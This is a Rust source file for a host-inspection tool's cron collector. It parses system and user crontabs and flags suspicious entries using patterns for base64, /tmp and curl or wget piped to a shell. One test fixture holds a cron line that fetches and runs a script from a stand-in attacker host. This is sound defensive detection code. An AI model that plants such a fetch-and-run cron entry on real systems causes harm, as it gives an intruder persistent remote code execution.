//! `persistence.scheduled` — cron and related schedulers.

use rustmite_proto::{
    CollectorCost, CollectorId, CollectorReport, Observation, PathBytes, ScheduledTaskObs,
};

use crate::{emit, CollectCtx, CollectError, Collector, ObservationSink};

pub struct ScheduledCollector;

impl Collector for ScheduledCollector {
    fn id(&self) -> &'static str {
        CollectorId::PERSISTENCE_SCHEDULED.as_str()
    }

    fn cost(&self) -> CollectorCost {
        CollectorCost::Low
    }

    fn collect(
        &self,
        ctx: &CollectCtx<'_>,
        sink: &mut dyn ObservationSink,
    ) -> Result<CollectorReport, CollectError> {
        let mut count = 0u32;
        let mut saw_any = false;

        if let Some(data) = read_path(ctx, "etc/crontab") {
            saw_any = true;
            let s = String::from_utf8_lossy(&data);
            for line in parse_crontab_lines(&s, "system", "/etc/crontab", None) {
                if is_suspicious_scheduled_task(&line) {
                    emit(ctx, sink, Observation::ScheduledTask(line))?;
                    count = count.saturating_add(1);
                }
            }
        }

        if let Ok(entries) = ctx
            .fs
            .list_dir("etc/cron.d")
            .or_else(|_| ctx.proc.list_dir_raw("etc/cron.d"))
        {
            saw_any = true;
            for ent in entries {
                let fname = ent.name_str();
                if fname.starts_with('.') {
                    continue;
                }
                let rel = format!("etc/cron.d/{fname}");
                let Some(data) = read_path(ctx, &rel) else {
                    continue;
                };
                let path = format!("/etc/cron.d/{fname}");
                let s = String::from_utf8_lossy(&data);
                for line in parse_crontab_lines(&s, "cron.d", &path, None) {
                    if is_suspicious_scheduled_task(&line) {
                        emit(ctx, sink, Observation::ScheduledTask(line))?;
                        count = count.saturating_add(1);
                    }
                }
            }
        }

        if let Ok(entries) = ctx
            .fs
            .list_dir("var/spool/cron/crontabs")
            .or_else(|_| ctx.proc.list_dir_raw("var/spool/cron/crontabs"))
        {
            saw_any = true;
            for ent in entries {
                let user = ent.name_str();
                if user.starts_with('.') {
                    continue;
                }
                let rel = format!("var/spool/cron/crontabs/{user}");
                let Some(data) = read_path(ctx, &rel) else {
                    continue;
                };
                let path = format!("/var/spool/cron/crontabs/{user}");
                let s = String::from_utf8_lossy(&data);
                for line in parse_crontab_lines(&s, "user_crontab", &path, Some(user.as_ref())) {
                    if is_suspicious_scheduled_task(&line) {
                        emit(ctx, sink, Observation::ScheduledTask(line))?;
                        count = count.saturating_add(1);
                    }
                }
            }
        }

        if !saw_any {
            return Ok(CollectorReport::unsupported(
                CollectorId::PERSISTENCE_SCHEDULED,
                "no cron sources found",
            ));
        }

        Ok(CollectorReport::complete(
            CollectorId::PERSISTENCE_SCHEDULED,
            count,
            0,
        ))
    }
}

fn read_path(ctx: &CollectCtx<'_>, path: &str) -> Option<Vec<u8>> {
    ctx.proc.read(path).ok().or_else(|| ctx.fs.read(path).ok())
}

fn parse_crontab_lines(
    content: &str,
    kind: &str,
    path: &str,
    default_user: Option<&str>,
) -> Vec<ScheduledTaskObs> {
    let mut out = Vec::new();
    for raw in content.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some(obs) = parse_cron_line(line, kind, path, default_user) {
            out.push(obs);
        }
    }
    out
}

fn parse_cron_line(
    line: &str,
    kind: &str,
    path: &str,
    default_user: Option<&str>,
) -> Option<ScheduledTaskObs> {
    if line.starts_with('@') {
        let mut parts = line.split_whitespace();
        let schedule = parts.next()?.to_string();
        let command = parts.collect::<Vec<_>>().join(" ");
        if command.is_empty() {
            return None;
        }
        return Some(ScheduledTaskObs {
            kind: kind.to_string(),
            path: PathBytes::from_str(path),
            user: default_user.map(String::from),
            schedule: Some(schedule),
            command,
        });
    }

    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.len() < 6 {
        return None;
    }

    // `/etc/crontab` has a user field after the five time fields.
    let (schedule, user, command) = if kind == "system" && parts.len() >= 7 {
        (
            parts.get(0..5)?.join(" "),
            Some(parts[5].to_string()),
            parts.get(6..)?.join(" "),
        )
    } else {
        (
            parts.get(0..5)?.join(" "),
            default_user.map(String::from),
            parts.get(5..)?.join(" "),
        )
    };

    if command.is_empty() {
        return None;
    }

    Some(ScheduledTaskObs {
        kind: kind.to_string(),
        path: PathBytes::from_str(path),
        user,
        schedule: Some(schedule),
        command,
    })
}

fn is_suspicious_scheduled_task(task: &ScheduledTaskObs) -> bool {
    if task.schedule.as_deref() == Some("@reboot") {
        return true;
    }
    is_suspicious_cron_command(&task.command)
}

fn is_suspicious_cron_command(command: &str) -> bool {
    let lower = command.to_ascii_lowercase();
    if lower.contains("base64") {
        return true;
    }
    if lower.contains("/tmp") || lower.contains("/dev/shm") {
        return true;
    }
    if (lower.contains("curl") || lower.contains("wget"))
        && (lower.contains("| sh") || lower.contains("|sh") || lower.contains("| bash"))
    {
        return true;
    }
    lower.contains("curl|") || lower.contains("wget|")
}

#[cfg(test)]
mod tests {
    use super::*;
    use rustmite_proto::{Budget, Limits, Observation};
    use rustmite_sys::{FixtureFs, FixtureProc};
    use crate::VecSink;

    fn budget() -> Budget {
        Budget::new(&Limits::default(), 60_000, 0)
    }

    #[test]
    fn suspicious_cron_emitted() {
        let crontab = b"0 * * * * root curl http://evil.example/x | sh\n";
        let fx = FixtureProc::new("/tmp/rustmite-fx-cron").with_file("etc/crontab", crontab);
        let fs = FixtureFs::new();
        let b = budget();
        let ctx = CollectCtx {
            proc: &fx,
            fs: &fs,
            pid_probe: None,
            budget: &b,
            euid: 0,
            self_pid: 1,
            now_ms: 0,
        };
        let mut sink = VecSink::new();
        let report = ScheduledCollector.collect(&ctx, &mut sink).expect("collect");
        assert_eq!(report.observations, 1);
        assert!(sink.observations.iter().any(|o| matches!(
            o,
            Observation::ScheduledTask(t) if t.command.contains("curl")
        )));
    }

    #[test]
    fn clean_crontab_silent() {
        let crontab = b"0 * * * * root /usr/bin/run-parts /etc/cron.hourly\n";
        let fx = FixtureProc::new("/tmp/rustmite-fx-cron-clean").with_file("etc/crontab", crontab);
        let fs = FixtureFs::new();
        let b = budget();
        let ctx = CollectCtx {
            proc: &fx,
            fs: &fs,
            pid_probe: None,
            budget: &b,
            euid: 0,
            self_pid: 1,
            now_ms: 0,
        };
        let mut sink = VecSink::new();
        let report = ScheduledCollector.collect(&ctx, &mut sink).expect("collect");
        assert_eq!(report.observations, 0);
        assert!(sink.observations.is_empty());
    }
}
